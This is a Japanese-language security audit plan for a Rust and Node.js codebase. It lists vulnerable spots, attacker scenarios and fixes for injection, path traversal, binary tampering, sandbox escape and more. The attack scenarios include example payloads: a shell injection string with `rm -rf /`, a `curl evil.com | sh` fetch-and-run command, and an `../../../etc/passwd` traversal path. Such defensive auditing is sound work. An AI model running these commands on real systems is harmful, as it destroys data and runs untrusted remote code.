# 攻撃者視点セキュリティ脆弱性監査と改善計画

## 監査範囲

全コンポーネントを対象：

- Rustコード（core、cli、app-server、orchestrator等）
- Node.js/TypeScriptコード（install-binary.js、SDK、GUI）
- CI/CDワークフロー
- バイナリ配布システム
- 認証・認可システム
- ネットワーク通信

## 脆弱性カテゴリとチェックポイント

### 1. コマンドインジェクション

**危険箇所**:

- [scripts/install-binary.js](scripts/install-binary.js) Line 105, 107, 111: `exec()`でユーザー入力が直接使用
- `archivePath`と`destDir`が適切にエスケープされていない
- PowerShellコマンドに直接埋め込まれている
- [codex-rs/tui2/src/chatwidget.rs](codex-rs/tui2/src/chatwidget.rs) Line 1744: `!cmd`プレフィックスで直接シェル実行
- [codex-rs/tui/src/chatwidget.rs](codex-rs/tui/src/chatwidget.rs) Line 1900: 同様の問題
- [codex-rs/core/src/tasks/user_shell.rs](codex-rs/core/src/tasks/user_shell.rs): ユーザーシェルコマンドの検証

**攻撃シナリオ**:

- `archivePath`に`'; rm -rf /; '`のようなペイロードを注入
- `!cmd`経由で`rm -rf /`や`curl evil.com | sh`を実行

**修正方針**:

- パラメータ化されたコマンド実行（引数を配列で渡す）
- 入力サニタイゼーション（特殊文字のエスケープ）
- ホワイトリストベースのコマンド検証

### 2. パストラバーサル

**危険箇所**:

- [codex-rs/orchestrator/src/server.rs](codex-rs/orchestrator/src/server.rs) Line 575: `canonicalize()`は使用されているが、ベースディレクトリ制限がない
- [codex-rs/core/src/agents/permission_checker.rs](codex-rs/core/src/agents/permission_checker.rs): パス検証ロジック
- ファイル操作全般（read、write、delete）

**攻撃シナリオ**:

- `../../../etc/passwd`のような相対パスでシステムファイルにアクセス
- シンボリックリンクを利用した権限昇格

**修正方針**:

- ベースディレクトリの制限（`starts_with`チェック）
- シンボリックリンクの解決と検証
- パスの正規化と検証

### 3. バイナリ配布の改ざんリスク

**危険箇所**:

- [scripts/install-binary.js](scripts/install-binary.js): SHA256検証が実装されているが使用されていない（Line 81-93）
- HTTPSリダイレクトの検証が不十分（Line 50-54）
- 証明書ピニングがない

**攻撃シナリオ**:

- 中間者攻撃（MITM）でバイナリを改ざん
- DNSハイジャックで偽のGitHubサーバーにリダイレクト
- リリースページの改ざん

**修正方針**:

- SHA256チェックサムの必須検証
- 証明書ピニングの実装
- リダイレクト回数の制限
- バイナリ署名の検証（GPG）

### 4. 認証・認可の不備

**危険箇所**:

- [codex-rs/orchestrator/src/server.rs](codex-rs/orchestrator/src/server.rs): RPCメソッドの認証チェック
- [codex-rs/core/src/agents/permission_checker.rs](codex-rs/core/src/agents/permission_checker.rs): 権限チェックロジック
- APIキーの管理と検証

**攻撃シナリオ**:

- 認証なしでRPCメソッドを呼び出し
- 権限チェックのバイパス
- セッション固定攻撃

**修正方針**:

- すべてのRPCメソッドに認証チェックを追加
- ロールベースアクセス制御（RBAC）の実装
- セッショントークンの検証とリフレッシュ

### 5. 機密情報の漏洩

**危険箇所**:

- ログ出力: APIキー、トークン、パスワードがログに記録される可能性
- エラーメッセージ: スタックトレースに機密情報が含まれる
- 環境変数の処理: `unsafe`ブロックでの`env::set_var`/`remove_var`

**攻撃シナリオ**:

- ログファイルからAPIキーを抽出
- エラーメッセージから内部構造を推測
- 環境変数の読み取り

**修正方針**:

- 機密情報のマスキング（ログ、エラーメッセージ）
- セキュアなログ管理
- 環境変数の暗号化

### 6. サンドボックス回避

**危険箇所**:

- [codex-rs/core/src/qc/sandboxed_execution.rs](codex-rs/core/src/qc/sandboxed_execution.rs): サンドボックス実装
- [codex-rs/core/src/tools/sandboxing.rs](codex-rs/core/src/tools/sandboxing.rs): サンドボックス権限
- 権限昇格の可能性

**攻撃シナリオ**:

- サンドボックス制限の回避
- 権限昇格によるシステムアクセス
- ファイルシステムの制限回避

**修正方針**:

- サンドボックス制限の強化
- 権限チェックの追加
- 監査ログの実装

### 7. ネットワーク通信の脆弱性

**危険箇所**:

- HTTPS/TLS証明書の検証
- [codex-rs/otel/src/otel_provider.rs](codex-rs/otel/src/otel_provider.rs): TLS設定
- HTTPリクエストの検証

**攻撃シナリオ**:

- 自己署名証明書の受け入れ
- TLS証明書検証の無効化
- 中間者攻撃

**修正方針**:

- 証明書検証の強制
- TLS 1.3の強制
- 証明書ピニング

### 8. 依存関係の脆弱性

**危険箇所**:

- Cargo.toml: Rust依存関係
- package.json: Node.js依存関係
- 既知のCVE

**修正方針**:

- `cargo audit`の実行
- `npm audit`の実行
- 依存関係の更新

- 権限チェックの実装
